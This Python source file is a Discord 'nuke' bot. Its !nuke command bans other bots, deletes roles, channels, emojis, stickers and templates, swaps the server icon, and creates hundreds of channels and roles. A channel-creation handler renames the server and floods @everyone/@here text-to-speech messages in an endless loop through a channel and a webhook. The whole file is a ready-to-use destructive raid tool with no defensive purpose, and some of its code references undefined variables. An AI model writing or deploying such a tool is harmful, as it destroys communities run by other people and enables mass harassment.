import discord
import json
import itertools
from discord.ext import commands
import asyncio

colors = [
    discord.Colour.red(),
    discord.Colour.orange(),
    discord.Colour.gold(),
    discord.Colour.green(),
    discord.Colour.blue(),
    discord.Colour.purple()
]
color_cycle = itertools.cycle(colors)

config_data: dict = json.load(open('config.json', encoding = 'utf-8'))

bot = commands.Bot(command_prefix = "!", intents=discord.Intents.all())

@bot.event 
async def on_ready():
    print("\n[1;31m機器人已準備就緒\n \n[1;2m[1;33m[1;37m幫助列表\n[2;36m!check[0m 檢查機器人是否有權限\n[2;36m!nuke[0m  開始轟炸伺服器")


@bot.command()
async def nuke(ctx):

  await ctx.message.delete()

  bots = filter(lambda member: member.bot and member != bot.user, ctx.guild.members)
  for bot_member in bots:
    try:
      await ctx.guild.ban(bot_member)

    except:
      continue

  if config_data['del_roles'] == True:
    for role in ctx.guild.roles:
      try:
        await role.delete()
      except:
        continue

  for sticker in ctx.guild.stickers:
    try:
      await sticker.delete()
    except:
      continue

  for emoji in ctx.guild.emojis:
    try:
      await emoji.delete()      
    except:
      continue

  for channel in ctx.guild.channels:
    try:
      await channel.delete()

    except:
      continue

  for template in await ctx.guild.templates():
    try:
      await template.delete()

    except:
      continue
  
  with open(config_data['icon_path'], "rb") as f:
    icon_path = f.read()
    await ctx.guild.edit(icon=icon_path)

  for i in range(1, 500):
    color = next(color_cycle)
    await ctx.guild.create_text_channel(config_data['channel_name'])
    await channel.guild.create_role(name = config_data['role_name'], color=color)

@bot.command()
async def check(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    if guild:
        bot_member = guild.me

        if bot_member.guild_permissions.administrator:
            await ctx.author.send("機器人擁有管理員權限")

        else:
            await ctx.channel.send("機器人沒有管理員權限")

    else:
        await ctx.channel.send("這個指令只能在伺服器中使用")

@bot.event
async def on_guild_channel_create(channel):

  if channel.name==config_data['channel_name']:
    await channel.guild.edit(name = config_data['server_name'])
    webhook = await channel.create_webhook(name= config_data['webhook_name'])

  while True:
    await channel.send("@everyone@here\n" + config_data['bot_message'], tts=True)
    await webhook.send("@everyone@here\n" + config_data['webhook_message'], tts=True)

bot.run(config_data['token'])
